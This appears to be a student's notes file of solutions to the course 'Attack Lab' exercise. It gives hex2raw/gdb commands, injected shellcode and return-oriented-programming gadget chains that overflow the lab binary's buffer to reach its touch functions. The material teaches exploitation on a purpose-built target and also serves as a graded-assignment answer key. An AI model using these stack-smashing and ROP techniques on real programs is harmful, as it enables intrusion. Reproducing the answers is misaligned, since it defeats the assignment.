
// command to run the program with customized hex code
cat exploit.txt | ./hex2raw | ./ctarget -q

// command to debug in gdb
run < exploit_raw.txt -q


// disassemble the binary file to asm
objdump -d ctarget > ctarget.d

// convert txt hex to the format that the program can read
./hex2raw < exploit.txt >| exploit_raw.txt


// phase_1
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
c0 17 40 00 00 00 00 00
  

# Example of hand-generated assembly code
pushq $0xabcdef # Push value onto stack
addq $17,%rax # Add 17 to %rax
movl %eax,%edx # Copy lower 32 bits of %eax to %edx

// use command to compile and disassemble them to generate machine code
unix> gcc -c example.s
unix> objdump -d example.o > example.d




# Example of hand-generated assembly code
mov $0x59b997fa, %rdi # Push value onto stack
pushq $0x004017ec
retq


48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3

// phase_2
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
51 51 51
51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
78 dc 61 55 00 00 00 00

  
// phase_3
mov $0x5561dca8, %rdi
push  $0x4018fa # ret touch3
ret
// phase_3 machine code  
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00

  
// phase_4
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00


addr to garget popq rax
data to be popq and store to %rax
addr to garget mov rax rdi
addr to touch_2


// phase_5
key: use <add_xy> in source file

// referenced solution:
// from https://www.ravenxrz.ink/archives/f81059da.html
// Thanks for this blog LOL

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* fill 0x00 */
06 1a 40 00 00 00 00 00 /* mov $rsp,$rax */
c5 19 40 00 00 00 00 00 /* mov $rax,$rdi */
ab 19 40 00 00 00 00 00 /* pop $rax */
48 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* movl $eax,$edx */
34 1a 40 00 00 00 00 00 /* movl $edx,$ecx */
63 1a 40 00 00 00 00 00 /* movl $ecx,$esi */
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
fa 18 40 00 00 00 00 00 /* touch3 address */
35 39 62 39 39 37 66 61 00 /* cookie value */
  
  
// personal solution:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* fill 0x00 */
06 1a 40 00 00 00 00 00 /* mov $rsp,$rax */
c5 19 40 00 00 00 00 00 /* mov $rax,$rdi */
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */ (rsi should be 0x30)
a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
fa 18 40 00 00 00 00 00 /* touch3 address */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* offset */
35 39 62 39 39 37 66 61 00 /* cookie value */ (address %rdi + 0x30)

